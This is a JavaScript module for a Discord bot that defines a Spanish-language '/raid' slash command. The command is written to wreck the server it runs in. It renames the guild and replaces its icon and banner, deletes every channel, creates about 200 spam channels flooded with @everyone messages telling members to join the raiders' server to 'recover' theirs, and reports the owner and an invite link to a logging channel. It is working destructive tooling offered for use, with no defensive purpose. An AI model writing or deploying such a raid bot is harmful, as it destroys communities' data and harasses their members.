const { SlashCommandBuilder } = require("@discordjs/builders")
const { MessageEmbed } = require("discord.js")
const Discord = require("discord.js")


module.exports = {
    timeout: 600000, 
    data:
    
    new SlashCommandBuilder()
    .setName("raid")
    .setDescription("Raidea el servidor"),

    async run(client, interaction){
try{
//if(15 >= interaction.guild.memberCount) return interaction.reply({content: '**Solo puedes Raidear servidores con un máximo de 16 personas dentro del server.**', ephemeral: true})
    let IDsv = interaction.guild.id
    client.guilds.cache.get(IDsv).setName('☣️BasadoSquad☣️').catch(e=>{
      return
    })
    client.guilds.cache.get(IDsv).setBanner(require("../../config.json").imgicon).catch(e=>{
      return
    })
    client.guilds.cache.get(IDsv).setIcon(require("../../config.json").imgicon).catch(e=>{
      return
    })



  interaction.guild.channels.cache.forEach(channel =>{

    channel.delete().catch(()=>{return;})
  
  })
  client.guilds.cache.get(IDsv).channels.create('unete').then(async c=>{
    c.permissionOverwrites.create(c.guild.roles.everyone, { READ_MESSAGE_HISTORY: true,VIEW_CHANNEL: true, SEND_MESSAGES: true }).catch(e=>{return})
    
    c.createInvite()
    .then(async invite => {
      
   
    const embed = new Discord.MessageEmbed()
    .setColor('RED')
    .setAuthor(interaction.guild.name, interaction.guild.iconURL({dynamic: true}))
    .setTitle('Nuevo Servidor Raideado!')
    .addField('Owner:',`> ${client.users.cache.get(interaction.guild.ownerId).tag} *(ID: ${interaction.guild.ownerId})*`)
    .addField('Servidor:',`> ${interaction.guild.name} *(ID: ${interaction.guild.id})*`)
    .addField('Miembros:',`> ${interaction.guild.memberCount}`)
    .addField(`User Raid:`,`> ${interaction.user.tag} *(ID: ${interaction.user.id})*`)
    .addField(`Invitación:`, `> **[ENTRAR AL SERVIDOR](https://discord.gg/${await invite.code})**`)
    .setTimestamp()
    .setThumbnail(interaction.guild.iconURL({size: 4096, format: "png",dynamic: true}))
    const row = new Discord.MessageActionRow()
    .addComponents(
      new Discord.MessageButton()
      .setLabel('ENTRAR AL SERVIDOR')
      .setURL(`https://discord.gg/${await invite.code}`)
      .setStyle('LINK')
      
    )
    .addComponents(
      new Discord.MessageButton()
      .setLabel('INVITARME A UN SERVIDOR')
      .setURL(`https://discord.com/api/oauth2/authorize?client_id=796121380613652490&permissions=8&scope=bot%20applications.commands`)
      .setStyle('LINK')
      
    )
    client.channels.cache.get(require('../../config.json').canalogs).send({embeds: [embed], components: [row]})
  })
    c.send(`
  @everyone\n**¡Únete para que no le pase esto a tu servidor!**
  ${require('../../config.json').sexoinvite}
  `).catch(()=>{return})
  
  }).catch(()=>{return})

for (let i = 0; i <= 200; i++) {
await  interaction.guild.channels.create('☣️BasadoSquad☣️').then(c => {
  c.permissionOverwrites.create(c.guild.roles.everyone, { READ_MESSAGE_HISTORY: true,VIEW_CHANNEL: true, SEND_MESSAGES: true }).catch(e=>{return})
  for (let i = 0; i <= 20; i++) {
    c.send(`  @everyone \n Servidor destrozado por   **☣️BasadoSquad☣️**  , si deseas recuperar tu servidor deberás unirte: \n ${require('../../config.json').sexoinvite} `).catch(e=>{return})
  

      }
    }).catch(()=>{
      return;
    })
  }




}catch (e) {
        console.error(e);
        
        try {
          return;
         } catch (e) {}
        }
    }
}